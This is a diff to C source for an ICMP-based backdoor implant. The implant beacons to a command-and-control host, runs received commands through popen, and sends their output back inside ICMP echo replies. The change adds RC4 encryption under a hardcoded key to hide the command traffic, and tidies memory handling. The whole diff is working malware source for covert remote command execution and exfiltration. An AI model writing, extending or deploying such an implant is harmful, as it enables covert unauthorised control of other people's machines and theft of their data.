@@ -6,6 +6,10 @@
 #include <netinet/ip.h>
 #include <arpa/inet.h>
 #include "../include/implant.h"
+#include "../include/rc4.h"
+
+#define KEY "thisisapassword"
+#define KEY_LENGTH 15
 
 // creates a raw ICMP socket and binds it
 int create_socket(void) {
@@ -44,37 +48,47 @@ unsigned short cksum(unsigned short *addr, int len) {
     return answer;
 }
 
-// runs the command from the C2 and returns the output
-char *invoke_command(char *data) {
+// runs the command from the C2 and stores it in output, and returns the output size
+size_t invoke_command(unsigned char *data, unsigned char *output) {
     FILE *ptr;
-    char *temp_buffer = (char *) calloc(4096, 1);
+    unsigned char *temp_buffer = (unsigned char *) calloc(BUFFER_SIZE, 1);
     char *buffer;
     char *command;
+    size_t temp_buffer_size;
+ 
+    data[strlen((char *) data) - 1] = '\0'; // strip the newline
 
-    data[strlen(data)-1] = '\0'; // strip the newline
+    // decrypt the command
+    RC4(data, strlen((char *) data), (unsigned char *) KEY, KEY_LENGTH, temp_buffer);
 
-    command = strcat(data, " 2>&1"); // redirect stderr to stdout
-
-
+    command = strcat((char *) temp_buffer, " 2>&1"); // redirect stderr to stdout
+    
     ptr = popen(command, "r");
     if (ptr == NULL) {
         perror("popen()");
-        return NULL;
+        return 0;
     }
 
-    fread(temp_buffer, 4096, 1, ptr);
+    fread(temp_buffer, BUFFER_SIZE, 1, ptr);
+    temp_buffer_size = strlen((char *) temp_buffer);
 
-    buffer = calloc(strlen(temp_buffer), 1);
-    strncpy(buffer, temp_buffer, strlen(temp_buffer));
+    buffer = calloc(temp_buffer_size, 1);
+    strncpy(buffer, (char *) temp_buffer, temp_buffer_size);
+
+    //memset(output, '\0', temp_buffer_size);
+
+    // encrypt the output
+    RC4((unsigned char *) buffer, temp_buffer_size, (unsigned char *) KEY, KEY_LENGTH, output);
 
     free(temp_buffer);
+    free(buffer);
     pclose(ptr);
 
-    return buffer;
+    return temp_buffer_size;
 }
 
 // reads from the socket and put it in the buffer
-int read_from_socket(int sockfd, char *buffer, int size) {
+int read_from_socket(int sockfd, unsigned char *buffer, int size) {
     int bytes_num = read(sockfd, buffer, size);
 
     if (bytes_num < 0) {
@@ -90,10 +104,10 @@ int send_beacon(int sockfd, char *dst_ip) {
     char *packet;
     struct icmphdr *icmp;
     int packet_size = sizeof(struct icmphdr *);
-    int bytes_num;
+    ssize_t bytes_num;
     struct sockaddr_in dst;
     
-    packet = (char *) malloc(packet_size);
+    packet = malloc(packet_size);
 
     // setting the IP options
     dst.sin_family = AF_INET;
@@ -132,23 +146,24 @@ int check_magic_byte(struct icmphdr *icmp) {
 void interact(int sockfd, char *dest_ip) {
     struct iphdr *ip; // holds the IP header
     struct icmphdr *icmp; // holds the ICMP header
-    char *data; // holds the ICMP's data section
-    char *output; // holds the output of the command
-    char *packet; // holds the packet
+    unsigned char *data; // holds the ICMP's data section
+    unsigned char *output = (unsigned char *) calloc(BUFFER_SIZE, 1); // holds the output of the command
+    unsigned char *packet; // holds the packet
     struct sockaddr_in addr;
-    size_t bytes_num, packet_size; 
+    size_t bytes_num, packet_size, output_size; 
 
     // calculating the packet size
     packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr) + BUFFER_SIZE;
 
     // allocating a buffer to store the recieved ICMP packet
-    packet = (char *) malloc(packet_size);
-    data = (char *) malloc(BUFFER_SIZE);
+    packet = (unsigned char *) malloc(packet_size);
+    data = (unsigned char *) malloc(BUFFER_SIZE);
 
     if (packet == NULL || data == NULL) {
         fprintf(stdout, "Error: Cannot allocate memory\n");
+        free(data);
         free(packet);
-        close(sockfd);
+        return;
     }
 
     while (1) {
@@ -170,21 +185,21 @@ void interact(int sockfd, char *dest_ip) {
         icmp->type = 0;
 
         // get the data section (ignoring the IP & ICMP headers + ICMP time data + junk prefix bytes)
-        data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
+        data = (unsigned char *) (packet + sizeof(struct iphdr) + sizeof(struct icmphdr));
         data[BUFFER_SIZE] = '\0';
 
         // invoke the command
-        output = invoke_command(data);
+        output_size = invoke_command(data, output);
 
         // put the output in the data section of the ICMP packet
-        memcpy((char *) data, output, strlen(output));
+        memcpy(data, output, output_size);
 
         // calculate the checksum
         icmp->checksum = 0; // needs to be set before calculating for some weird reason
-        icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + strlen(output));
+        icmp->checksum = cksum((unsigned short *) icmp, sizeof(struct icmphdr) + output_size);
 
         // send it
-        bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr) + strlen(output), 0, (struct sockaddr *) &addr, sizeof(addr));
+        bytes_num = sendto(sockfd, icmp, sizeof(struct icmphdr) + output_size, 0, (struct sockaddr *) &addr, sizeof(addr));
         if (bytes_num < 0) {
             perror("sendto()");
             break;
@@ -193,14 +208,12 @@ void interact(int sockfd, char *dest_ip) {
         // clean up the packet buffer for the next usage
         memset(packet, '\0', packet_size);
 
-        free(output);
     }
-  
-    free(dest_ip);
+
+    free(packet);
     free(data);
     free(output);
     free(packet);
-    close(sockfd);
 }
 
 // initializes the options and starts the implant
@@ -208,4 +221,6 @@ void implant_init_n_call(char *dest_ip) {
     int sockfd = create_socket();
     
     interact(sockfd, dest_ip);
+
+    close(sockfd);
 }
